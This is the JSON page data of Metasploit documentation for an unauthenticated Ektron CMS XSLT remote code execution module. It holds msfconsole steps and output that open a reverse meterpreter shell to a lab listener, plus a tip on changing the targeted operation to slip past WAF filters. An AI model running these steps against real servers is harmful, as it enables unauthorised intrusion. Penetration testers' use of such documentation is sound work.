{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/http/ektron_xslt_exec_ws","result":{"data":{"moduleMetadataJson":{"id":"930c0bce-9a73-5768-9ff8-94be5f1b5a58","name":"Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution","fullname":"exploit/windows/http/ektron_xslt_exec_ws","description":"Ektron 8.5, 8.7 <= sp1, 9.0 < sp1 have\nvulnerabilities in various operations within the ServerControlWS.asmx\nweb services. These vulnerabilities allow for RCE without authentication and\nexecute in the context of IIS on the remote system.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/http/ektron_xslt_exec_ws","documentationSlug":"/modules/documentation/exploit/windows/http/ektron_xslt_exec_ws"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  <a href=\"http://www.episerver.com/cms/ektron/\">Ektron Content Management System (CMS)</a> 8.0, 8.5, and 8.7 before 8.7sp2 and 9.0 before sp1 (according to CVE-2015-0923)</p>\n<p>  Ektron has been acquired by Epi Server and finding installers may prove difficult.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>   But if you can build a test network the following may be used to verify:</p>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/http/ektron_xslt_exec_ws</code></li>\n<li>Do: <code class=\"language-text\">set RHOST [target ip]</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n<li>You should receive a target vulnerable message.</li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell.</li>\n</ol>\n<p>  In our experience testing against 64 bit hosts should still pass the 'check' in step 6 and return a target vulnerable message. But when injecting shellcode into a new thread it may require the tester to adjust the payload as well. This may be done as follows:</p>\n<ol>\n<li>Do <code class=\"language-text\">set PAYLOAD windows/x64/meterpreter</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  These are important but perhaps less-used options. There are quite a few other 'web' options available which will not be discussed due to their generality.</p>\n<p>  <strong>TARGETOP</strong></p>\n<p>  There are multiple operations which are vulnerable to this XSLT bug. We have enumerated more (likely all) of the operations in ServerControlWS.asmx and provide testers with the ability to test the additional operations by setting this option to one of the following: ContentBlockEx, GetContentFlaggingString,GetMessagingString, GetBookmarkString, GetContentRatingString</p>\n<p>  This value defaults to ContentBlockEx (from the original reports). Testers may find adjusting this value useful if defenders have included Web Application Firewall (WAF) rules to specifically filter ContentBlockEx as a mitigation in lieu of updating.</p>\n<p>  <strong>TARGETURI</strong></p>\n<p>  This allows the tester to adjust the base-installation path. The default value is '/cms400min' but in our experience many deployments are simply the root path '/'.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>  Checking if a target is vulnerable.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/http/ektron_xslt_exec_ws\nmsf exploit(ektron_xslt_exec_ws) &gt; set RHOST 192.168.1.175\nRHOST =&gt; 192.168.1.175\nmsf exploit(ektron_xslt_exec_ws) &gt; check\n[+] 192.168.1.175:80 The target is vulnerable\nmsf exploit(ektron_xslt_exec_ws) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  Exploiting a Win7 x64 installation to obtain shell.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/http/ektron_xslt_exec_ws\nmsf exploit(ektron_xslt_exec_ws) &gt; set RHOST 192.168.1.175\nRHOST =&gt; 192.168.1.175\nmsf exploit(ektron_xslt_exec_ws) &gt; check\n[+] 192.168.1.175:80 The target is vulnerable.\nmsf exploit(ektron_xslt_exec_ws) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp\nmsf exploit(ektron_xslt_exec_ws) &gt; set LHOST 192.168.1.50\nLHOST =&gt; 192.168.1.50\nmsf exploit(ektron_xslt_exec_ws) &gt; exploit\n[*] Started reverse TCP handler on 192.168.1.50:4444\n[*] Generating the EXE Payload and the XSLT...\n[*] Trying to run the xslt transformation...\n[+] Exploitation was successful\n[*] Sending stage (1189423 bytes) to 192.168.1.175\n[*] Meterpreter session 1 opened (192.168.1.50:4444 -&gt; 192.168.1.175:49169) at 2016-10-30 04:36:50 +0000\n\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"930c0bce-9a73-5768-9ff8-94be5f1b5a58"}}}